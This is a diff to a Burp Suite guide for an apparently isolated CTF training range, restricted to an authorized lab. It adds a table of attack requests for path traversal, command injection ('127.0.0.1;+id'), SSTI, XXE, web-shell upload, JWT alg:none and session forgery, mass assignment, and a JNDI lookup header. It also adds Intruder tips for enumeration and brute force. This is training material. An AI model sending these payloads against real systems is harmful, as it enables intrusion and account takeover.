@@ -1,4 +1,10 @@
-# Burp Suite guide — HELPAG OWASP Top 10 lab
+# Burp Suite guide — HELP AG VAPT range
+
+> This guide covers the OWASP Top 10 baseline endpoints. The range is now a
+> 22-challenge CTF; the challenges this guide does not reach (command injection,
+> SSTI, XXE, path traversal, file upload, JWT `alg:none`, forged Flask sessions,
+> predictable reset tokens) are covered in [`CTF_PLAYBOOK.md`](CTF_PLAYBOOK.md)
+> section 7, with Repeater-ready requests.
 
 This guide is only for the isolated `HELPAG-VAPT-Test-Site` deployed in your
 authorized lab. Do not aim these requests at a public or production system.
@@ -312,3 +318,38 @@ all OWASP event types are searchable, and every finding is reproducible in Burp
 Repeater. A missing event is a telemetry failure even when the vulnerable
 behavior itself is reproduced.
 
+
+
+---
+
+## 16. CTF challenges beyond the OWASP baseline
+
+Load these into Repeater alongside the sections above. Full walkthroughs, flags
+and detection SPL are in [`CTF_PLAYBOOK.md`](CTF_PLAYBOOK.md).
+
+| Challenge | Request to build in Repeater |
+|---|---|
+| Path traversal | `GET /api/documents/download?file=../flagstore/traversal.flag` |
+| Command injection | `GET /api/diagnostics/ping?host=127.0.0.1;+id` |
+| SSTI | `GET /api/newsletter/preview?template={{7*7}}` |
+| XXE | `POST /api/suppliers/import` with an XML body declaring a `SYSTEM` entity |
+| Unrestricted upload | `POST /api/upload`, multipart field `file`, filename `shell.php` |
+| JWT `alg:none` | `GET /api/admin/report` with a forged unsigned bearer token |
+| Forged session | `GET /admin/panel` with a session cookie signed by the leaked secret |
+| Mass assignment | `POST /api/profile/update` with `{"role":"admin"}` |
+| Predictable reset | `POST /api/password-reset/consume` with `md5(username)` as the token |
+| JNDI lookup | `GET /api/legacy/audit` with header `X-Audit-Agent: ${jndi:ldap://x/a}` |
+
+**Intruder tips for this range**
+
+- *Sniper* on `/api/users/§1§` with a number payload set enumerates the IDOR —
+  set Grep-Match on `HELPAG{` to find the interesting record instantly.
+- *Cluster bomb* on `/api/login` with `wordlists/helpag-passwords.txt` reproduces
+  the brute-force challenge; there is no lockout, so no throttling is needed.
+- Use Burp's **Decoder** on a JWT from `/api/token` to see the `alg` header, then
+  re-encode with `"alg":"none"` and drop the signature segment.
+- Burp's **Session handling rules** will happily replay a forged
+  `session` cookie across every request once you set it in a macro.
+
+Grep-Match `HELPAG{` in Intruder and Scanner results — every successful exploit
+on this range returns its flag in the response body.
